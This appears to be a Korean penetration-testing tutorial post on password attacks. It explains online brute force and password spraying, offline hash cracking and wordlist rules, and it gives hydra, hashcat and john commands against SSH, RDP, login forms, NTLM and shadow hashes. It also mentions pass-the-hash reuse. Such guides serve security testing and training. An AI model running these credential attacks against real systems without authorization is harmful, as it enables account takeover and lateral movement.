---
title: "패스워드 공격과 해시 크래킹"
date: 2026-10-17 09:00:00 +0900
categories: [Penetration Testing, Credentials]
tags: [password-attacks, hydra, hashcat, john, ntlm, wordlist]
description: "서비스 로그인 공격(브루트포스·스프레이)과 오프라인 해시 크래킹의 원리, 워드리스트 변형·룰, NTLM 처리까지 패스워드 공격의 개념과 구문을 정리합니다."
mermaid: true
---

> 패스워드 공격은 두 갈래다. 서비스에 직접 로그인 시도하는 **온라인 공격**(hydra 류)과, 획득한 해시를 떼어내 오프라인에서 푸는 **크래킹**(hashcat/john). 사람은 예측 가능한 비밀번호를 쓰므로, 좋은 워드리스트와 룰이 승부를 가른다.

## 개념

- **온라인 공격**: SSH·RDP·HTTP 로그인 폼 등에 후보 자격증명을 시도. **브루트포스**(전수)보다 **스프레이**(흔한 비밀번호 1~2개를 여러 계정에)가 잠금을 피하며 효율적. 잠금 정책·속도 제한에 주의.
- **오프라인 크래킹**: 해시를 확보하면 대상에 흔적 없이 GPU로 대량 시도. 핵심은 **해시 유형 식별 → 모드 선택 → 워드리스트+룰**.
- **워드리스트 변형(룰)**: 기본 단어에 대문자·숫자·특수문자 치환을 규칙으로 붙여(leetspeak, 연도 접미사) 현실적 변형을 커버.
- **해시 종류**: 빠른 해시(MD5/SHA1)는 잘 깨지고, 느린 해시(bcrypt/KDF)는 오래 걸린다. Windows는 **NTLM** 해시, 리눅스는 `/etc/shadow`의 KDF.

```
온라인: 서비스 ← 시도(느림·흔적·잠금)   → 스프레이 선호
오프라인: 해시 → GPU 크래킹(빠름·무흔적) → 워드리스트+룰
```

## 공격·우회 구문

허가된 대상에서만.

### 온라인(hydra)

```bash
hydra -l user -P wordlist.txt ssh://target.example
hydra -L users.txt -p 'Winter2026!' rdp://target.example   # 스프레이
hydra -l admin -P wordlist.txt target.example http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=invalid"
```

### 해시 유형 식별·크래킹

```bash
hashid '<hash>'            # 유형 추정
hashcat -m 1000 ntlm.txt wordlist.txt            # NTLM
hashcat -m 1800 shadow.txt wordlist.txt          # sha512crypt
john --format=raw-sha256 hashes.txt --wordlist=wordlist.txt
```

### 워드리스트 변형(룰)

```bash
hashcat -m 1000 ntlm.txt wordlist.txt -r rules/best64.rule
# 룰 예: c=첫글자 대문자, $2$0$2$6=연도 접미사, leet 치환
```

### 획득 해시 재사용(개념)

```
NTLM 해시는 pass-the-hash 로 재인증에 재사용 가능(크랙 불필요)
서비스/계정 간 비밀번호 재사용 → 수평 이동 입력
개인 키 암호(id_rsa)·KeePass(.kdbx) 등 보관소도 크래킹 대상
```

## 참고 자료

- [Hashcat Wiki](https://hashcat.net/wiki/)
- [John the Ripper](https://www.openwall.com/john/)
- [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)
